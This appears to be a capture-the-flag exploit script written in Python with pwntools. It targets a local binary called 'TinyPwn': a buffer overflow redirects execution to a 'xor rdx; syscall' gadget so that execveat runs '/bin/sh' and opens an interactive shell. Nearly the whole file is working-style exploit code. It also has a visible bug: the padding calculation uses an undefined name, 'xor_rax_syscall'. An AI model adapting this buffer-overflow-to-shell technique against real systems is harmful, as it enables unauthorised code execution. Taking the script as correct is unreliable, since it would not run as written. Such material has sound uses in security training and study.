#! /usr/bin/python

from pwn import *

s = process('./TinyPwn')

# syscall read will return amount of bytes into rax, we need it to be 0x142 to make stub_execveat syscall :
# 0x142	                                  %rax  
# int dfd	                              %rdi  - is already 0
# const char __user *filename	          %rsi  - in our case rsi is already pointing to buffer
# const char __user *const __user *argv   %rdx  - has to be 0 => we need to xor rdx
# const char __user *const __user *envp   %r10  - is already 0
# int flags                               %r8   - is already 0

execveat_rax_val = 0x142
padding = 0x130

# 4000ed:       48 31 d2                xor    %rdx,%rdx
# 4000f0:       0f 05                   syscall 
xor_rdx_syscall = p64(0x4000ed)


payload = '/bin/sh\x00'
payload += 'A' * (0x130 - len(payload) - len(xor_rax_syscall))
payload += xor_rdx_syscall
payload += 'B' * 0x11

#gdb.attach(s)

s.sendline(payload)

s.interactive()
